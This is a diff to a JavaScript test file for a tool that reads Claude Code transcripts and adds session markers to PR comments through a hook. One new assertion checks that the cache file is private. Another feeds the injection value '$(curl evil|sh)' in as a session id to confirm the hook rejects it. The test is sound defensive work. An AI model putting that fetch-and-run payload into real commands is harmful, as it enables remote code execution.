@@ -1,6 +1,6 @@
 import assert from 'node:assert/strict'
 import { execFileSync, spawn } from 'node:child_process'
-import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
+import { mkdirSync, mkdtempSync, readFileSync, rmSync, statSync, writeFileSync } from 'node:fs'
 import { tmpdir } from 'node:os'
 import path from 'node:path'
 import { describe, it } from 'node:test'
@@ -55,6 +55,7 @@ describe('transcript scan', () => {
       const answer = handle({ type: 'sessions', prs: ['o/api#5'] }, projects, cache)
       assert.deepEqual(answer, { ok: true, sessions: { 'o/api#5': [{ sessionId: ID, cwd: '/work/api', title: '', lastAt: '2026-01-01T00:00:00Z', kind: 'review' }] } })
       assert.ok(JSON.parse(readFileSync(cache, 'utf8'))[path.join(projects, 'p1', `${ID}.jsonl`)])
+      assert.equal(statSync(cache).mode & 0o777, 0o600, 'the cache is private to this user')
       assert.equal(/** @type {any} */ (handle({ type: 'ping' }, projects, cache)).version, 2)
       assert.equal(/** @type {any} */ (handle({ type: 'nope' }, projects, cache)).ok, false)
     } finally {
@@ -139,6 +140,7 @@ describe('Claude Code hook', () => {
     assert.equal(mcp?.hookSpecificOutput.updatedInput.body, `hi\n\n${mark}`)
     assert.equal(hookOutput({ session_id: ID, tool_name: 'Read', tool_input: { file_path: 'x' } }), null)
     assert.equal(hookOutput({ tool_name: 'Bash', tool_input: { command: 'gh pr comment 1 --body "hi"' } }), null, 'no session id')
+    assert.equal(hookOutput({ session_id: '$(curl evil|sh)', tool_name: 'Bash', tool_input: { command: 'gh pr comment 1 --body "hi"' } }), null, 'only a UUID goes into a command')
   })
 
   it('works as a real hook: JSON in on stdin, JSON out', () => {
